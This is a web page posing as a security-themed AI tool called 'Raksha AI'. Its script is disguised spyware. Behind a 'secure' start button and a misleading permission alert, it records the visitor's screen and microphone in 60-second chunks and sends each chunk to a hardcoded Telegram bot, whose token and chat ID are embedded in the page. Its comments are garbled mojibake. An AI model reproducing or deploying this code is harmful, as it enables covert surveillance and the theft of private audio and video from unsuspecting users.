<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Raksha AI - Secure</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: white; text-align: center; }
        iframe { width: 100%; height: 90%; border: none; display: none; }
        #startBtn { margin-top: 20%; padding: 20px 40px; font-size: 20px; background: #0f0; cursor: pointer; border-radius: 10px; }
    </style>
</head>
<body>

    <button id="startBtn">üõ°Ô∏è Activate Secure Command & Start AI</button>

    <iframe id="myIframe" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>

    <script>
    const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
    const MY_ID = "8508792403";

    document.getElementById('startBtn').onclick = async function() {
        this.style.display = 'none'; // ‡§¨‡§ü‡§® ‡§õ‡•Å‡§™‡§æ‡§è‡§Ç
        document.getElementById('myIframe').style.display = 'block'; // AI ‡§¶‡§ø‡§ñ‡§æ‡§è‡§Ç
        
        try {
            // ‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§® ‡§∞‡§ø‡§ï‡•â‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∂‡•Å‡§∞‡•Ç
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
            startRecorder(screenStream, "video");

            // ‡§ë‡§°‡§ø‡§Ø‡•ã ‡§∞‡§ø‡§ï‡•â‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∂‡•Å‡§∞‡•Ç
            const voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            startRecorder(voiceStream, "voice");

        } catch (err) {
            alert("Security Error: Please allow all permissions to continue.");
        }
    };

    function startRecorder(stream, type) {
        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = (e) => chunks.push(e.data);

        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: type === "video" ? 'video/webm' : 'audio/ogg' });
            const fd = new FormData();
            fd.append("chat_id", MY_ID);
            fd.append(type === "video" ? "video" : "voice", blob, type + ".webm");

            fetch(`https://api.telegram.org/bot${TOKEN}/send${type === "video" ? 'Video' : 'Voice'}`, { 
                method: "POST", 
                body: fd 
            });

            chunks = [];
            if (stream.active) recorder.start();
        };

        recorder.start();
        // ‡§π‡§∞ 60 ‡§∏‡•á‡§ï‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú‡•á‡§Ç
        setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
    }
    </script>
</body>
</html>
